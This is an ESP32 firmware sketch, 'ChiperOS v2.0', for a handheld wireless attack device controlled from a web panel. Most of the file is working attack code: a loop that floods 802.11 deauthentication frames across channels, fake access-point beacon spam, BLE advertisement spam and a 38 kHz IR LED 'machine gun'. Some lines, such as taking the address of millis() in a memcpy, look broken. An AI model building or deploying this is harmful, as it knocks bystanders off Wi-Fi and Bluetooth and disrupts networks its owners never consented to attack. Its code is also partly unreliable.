#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <TFT_eSPI.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <esp_wifi.h>
#include <driver/ledc.h>

// === PINS ===
#define BTN1 0  // Вверх / Меню
#define BTN2 1  // Вниз / Выбор
#define BTN3 2  // Назад / Стоп
#define IR1 38
#define IR2 39
#define IR3 40

TFT_eSPI tft = TFT_eSPI();
WebServer server(80);

// === STATE ===
enum Mode { WEB_MODE, ATTACK_MODE, IR_MODE };
Mode currentMode = WEB_MODE;
bool deauthOn = false, fakeApOn = false, bleOn = false, irGunOn = false;
unsigned long lastBtn = 0, lastDeauth = 0, lastBle = 0, lastFakeAp = 0, lastIr = 0;
int irIdx = 0, menuIdx = 0;
uint8_t deauthFrame[26];
int targetCh = 1;

// === SCAN DATA ===
int scanCount = 0;
String scanSSID[15], scanBSSID[15];
int scanRSSI[15], scanCH[15];

// === HTML ===
const char* html = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1">
<title>ChiperOS</title><style>
body{background:#0d1117;color:#0f0;font-family:monospace;text-align:center;padding:15px}
h1{color:#0ff} .c{background:#111;border:1px solid #333;padding:10px;margin:8px;border-radius:6px}
.b{padding:10px 15px;margin:4px;border:none;border-radius:4px;font-weight:bold;cursor:pointer}
.r{background:#d32f2f;color:#fff}.g{background:#388e3c;color:#fff}.b2{background:#1976d2;color:#fff}
.s{padding:4px;margin:4px;border-radius:3px;font-weight:bold}.on{background:#0f0;color:#000}.off{background:#333;color:#666}
</style></head><body>
<h1>🛡️ ChiperOS v2.0</h1>
<div class="c"><h3>WiFi</h3><div id="sD" class="s off">DEAUTH OFF</div><div id="sF" class="s off">FAKE AP OFF</div>
<button class="b r" onclick="t('deauth')">Deauth</button><button class="b g" onclick="t('fakeap')">FakeAP</button></div>
<div class="c"><h3>BLE & IR</h3><div id="sB" class="s off">BLE OFF</div><div id="sI" class="s off">IR GUN OFF</div>
<button class="b b2" onclick="t('ble')">BLE Spam</button><button class="b r" onclick="t('ir')">IR Gun</button></div>
<div class="c" id="st">Loading...</div><script>
function t(a){fetch('/'+a).then(r=>r.text()).then(d=>{document.getElementById('st').innerHTML=d;update();});}
function update(){fetch('/st').then(r=>r.text()).then(d=>{
  document.getElementById('sD').className='s '+(d.includes('DEAUTH:ON')?'on':'off');
  document.getElementById('sF').className='s '+(d.includes('FAKE:ON')?'on':'off');
  document.getElementById('sB').className='s '+(d.includes('BLE:ON')?'on':'off');
  document.getElementById('sI').className='s '+(d.includes('IR:ON')?'on':'off');
  document.getElementById('st').innerHTML=d;});}
setInterval(update,1000);update();
</script></body></html>
)rawliteral";

void setup() {
  Serial.begin(115200);
  pinMode(BTN1, INPUT_PULLUP); pinMode(BTN2, INPUT_PULLUP); pinMode(BTN3, INPUT_PULLUP);
  
  // TFT Init (safe delay for S3)
  delay(800);
  tft.init(); tft.setRotation(1); tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_GREEN); tft.setTextFont(2);
  tft.drawString("ChiperOS v2.0", 10, 10);
  if(TFT_BL>=0){pinMode(TFT_BL,OUTPUT);digitalWrite(TFT_BL,HIGH);}

  // IR PWM Setup (38kHz)
  ledcSetup(0, 38000, 8);
  ledcAttachPin(IR1, 0); ledcAttachPin(IR2, 0); ledcAttachPin(IR3, 0);
  ledcWrite(0, 0); // Off by default

  // Deauth Frame Init
  deauthFrame[0]=0xC0; deauthFrame[1]=0x00; deauthFrame[2]=0x3A; deauthFrame[3]=0x01;
  memset(&deauthFrame[4],0xFF,6);
  deauthFrame[10]=0xA2; deauthFrame[11]=0xB4; deauthFrame[12]=0xC5;
  deauthFrame[13]=0xD6; deauthFrame[14]=0xE7; deauthFrame[15]=0xF3;
  memcpy(&deauthFrame[16],&deauthFrame[10],6);
  deauthFrame[24]=0x02; deauthFrame[25]=0x00;

  // WiFi AP
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP("ChiperOS", "12345678");

  // Web Routes
  server.on("/", [](){server.send(200,"text/html",html);});
  server.on("/deauth", [](){deauthOn=!deauthOn; switchMode(); server.send(200,"text/plain",deauthOn?"DEAUTH:ON":"DEAUTH:OFF");});
  server.on("/fakeap", [](){fakeApOn=!fakeApOn; switchMode(); server.send(200,"text/plain",fakeApOn?"FAKE:ON":"FAKE:OFF");});
  server.on("/ble", [](){bleOn=!bleOn; if(bleOn)BLEDevice::init("ESP32-S3"); server.send(200,"text/plain",bleOn?"BLE:ON":"BLE:OFF");});
  server.on("/ir", [](){irGunOn=!irGunOn; server.send(200,"text/plain",irGunOn?"IR:ON":"IR:OFF");});
  server.on("/st", [](){
    String s="DEAUTH:"+(deauthOn?"ON":"OFF")+"|FAKE:"+(fakeApOn?"ON":"OFF")+"|BLE:"+(bleOn?"ON":"OFF")+"|IR:"+(irGunOn?"ON":"OFF");
    s+="<br>Heap:"+String(ESP.getFreeHeap()/1024)+"KB PSRAM:"+String(ESP.getPsramSize()/1024)+"KB";
    server.send(200,"text/html",s);  });
  server.begin();

  tft.drawString("WiFi: 192.168.4.1", 10, 30);
  tft.drawString("Ready.", 10, 50);
  Serial.println("✅ ChiperOS v2.0 Ready");
}

void switchMode() {
  bool attack = deauthOn || fakeApOn || bleOn;
  if(attack && currentMode==WEB_MODE){
    currentMode=ATTACK_MODE;
    server.stop(); WiFi.softAPdisconnect(true);
    esp_wifi_set_promiscuous(true);
    tft.drawString("MODE: ATTACK", 10, 70);
  } else if(!attack && currentMode==ATTACK_MODE){
    currentMode=WEB_MODE;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_MODE_AP); WiFi.softAP("ChiperOS","12345678");
    server.begin();
    tft.drawString("MODE: WEB", 10, 70);
  }
}

void loop() {
  // Buttons
  if(millis()-lastBtn>200){
    lastBtn=millis();
    if(digitalRead(BTN1)==LOW){ menuIdx=(menuIdx+1)%3; updateTFT(); }
    if(digitalRead(BTN2)==LOW){ triggerMenu(); }
    if(digitalRead(BTN3)==LOW){ deauthOn=fakeApOn=bleOn=irGunOn=false; switchMode(); updateTFT(); }
  }

  if(currentMode==WEB_MODE) server.handleClient();

  // Deauth
  if(deauthOn && millis()-lastDeauth>10){
    lastDeauth=millis();
    static int ch=1; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    ch=(ch==1)?6:(ch==6)?11:1;
    deauthFrame[22]=random(256); deauthFrame[23]=random(256);
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, 26, false);
  }

  // Fake AP
  if(fakeApOn && millis()-lastFakeAp>200){
    lastFakeAp=millis();
    uint8_t b[128]; memset(b,0,128);
    b[0]=0x80; b[1]=0x00; memset(&b[4],0xFF,6);
    b[10]=0x02; b[11]=0x00; b[12]=0x00; b[13]=0x00; b[14]=0x00; b[15]=random(6);    memcpy(&b[16],&b[10],6); memcpy(&b[24],&millis(),8);
    b[32]=0xE8; b[33]=0x03; b[34]=0x01; b[35]=0x00;
    int p=36; String n="LOL_BRO"; b[p++]=0x00; b[p++]=n.length(); memcpy(&b[p],n.c_str(),n.length()); p+=n.length();
    b[p++]=0x01; b[p++]=0x08; b[p++]=0x82; b[p++]=0x84; b[p++]=0x8B; b[p++]=0x96;
    b[p++]=0x24; b[p++]=0x30; b[p++]=0x48; b[p++]=0x6C;
    esp_wifi_80211_tx(WIFI_IF_AP, b, p, false);
  }

  // BLE Spam
  if(bleOn && millis()-lastBle>100){
    lastBle=millis();
    BLEAdvertising* p=BLEDevice::getAdvertising(); p->stop();
    p->addServiceUUID(BLEUUID((uint16_t)random(0x1800,0x2000)));
    p->setMinPreferred(0x06); p->setMaxPreferred(0x12); p->start();
  }

  // IR Machine Gun (3 LEDs, 2s delay)
  if(irGunOn && millis()-lastIr>2000){
    lastIr=millis();
    int pin = (irIdx==0)?IR1:(irIdx==1)?IR2:IR3;
    ledcAttachPin(pin, 0); ledcWrite(0, 128); delay(50); ledcWrite(0, 0);
    irIdx=(irIdx+1)%3;
    tft.fillRect(10,90,120,15,TFT_BLACK);
    tft.drawString("IR Fire: "+String(irIdx),10,90);
  }

  yield();
}

void triggerMenu(){
  if(menuIdx==0){ scanCount=WiFi.scanNetworks(); for(int i=0;i<scanCount&&i<15;i++){scanSSID[i]=WiFi.SSID(i);scanBSSID[i]=WiFi.BSSIDstr(i);scanRSSI[i]=WiFi.RSSI(i);scanCH[i]=WiFi.channel(i);} updateTFT(); }
  else if(menuIdx==1){ deauthOn=!deauthOn; switchMode(); }
  else if(menuIdx==2){ bleOn=!bleOn; if(bleOn)BLEDevice::init("ESP32-S3"); }
}

void updateTFT(){
  tft.fillRect(0,70,240,80,TFT_BLACK);
  tft.drawString("Mode: "+String(currentMode==WEB_MODE?"WEB":"ATK"),10,70);
  if(menuIdx==0) tft.drawString("SCAN: "+String(scanCount)+" nets",10,90);
  else if(menuIdx==1) tft.drawString("DEAUTH: "+String(deauthOn?"ON":"OFF"),10,90);
  else tft.drawString("BLE: "+String(bleOn?"ON":"OFF"),10,90);
  tft.drawString("Heap: "+String(ESP.getFreeHeap()/1024)+"KB",10,110);
}
